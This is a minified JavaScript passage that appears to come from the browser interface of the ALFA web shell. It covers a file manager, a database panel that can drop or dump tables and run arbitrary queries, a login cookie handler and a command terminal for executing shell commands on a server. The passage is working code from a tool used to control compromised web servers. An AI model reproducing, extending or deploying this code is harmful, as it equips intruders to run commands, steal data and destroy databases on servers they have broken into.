Table" target=".cls-'+i+'" onkeyup="riotMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"riotLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="riotMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="riotMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="riotMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="https://dev.artikelspiner.id/icon/b_minus.png"}function riotMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;riotMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{riot2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),riotMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",riotMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function riotMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function riotMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function riotMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function riotLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");riotMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{riot2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=riotMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='riotMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='riotMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='riotMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='riotMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='riotMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='riotMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",riotMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",riotMysqlReportBuilder(i,e)}})}function riotMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,riotMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{riot2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function riotMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),riotMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{riot2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),riotMysqlReportBuilder(a,e),riotMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function riotMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");riotMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{riot2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='riotMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,riotMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function riotMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function riotMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;riotMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{riot2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function riotMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,riotMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{riot2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function riotMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function riotMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");riotMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{riot2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),riotMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function riotRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function riotLogOut(){riotRemoveCookie("AlfaUser"),riotRemoveCookie("AlfaPass"),location.reload()}var riotAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"https://dev.artikelspiner.id/icon/check-mark1.svg"},error:{class:"alert-error",icon:"https://dev.artikelspiner.id/icon/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function riotShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new riotAlertBox("#alert-area",r).show(e)}function riotSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(riot_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(riot_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(riot_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+riot_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="https://dev.artikelspiner.id/icon/delete.svg"></div><div class="sql-newtab" onclick="riot_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),riotShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&riotUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),riot_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(riot_can_add_opt){riot_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Alfa Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="https://dev.artikelspiner.id/icon/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'riotBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'riotBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),riotShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&riotUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'riotBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'riotBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function riotBeforeDoAction(e){riot_before_do_action_id=e}function riotLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function riotAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_ALFA_AJAX_.hasOwnProperty(t)&&_ALFA_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,riot_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),riotFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),riotUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),riotUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;riot_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),riotUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),riotUpdateOptionsBadge("editor")}function riotUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function riotOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"riotTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="riotExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;padding-left: 20px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #B501F7;padding-right:35px;" onkeyup="riotWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #B501F7;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #B501F7;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="riotExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="https://icons.iconarchive.com/icons/hamzasaleem/stock-apps-style-2-part-2/128/Time-Machine-icon.png"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" 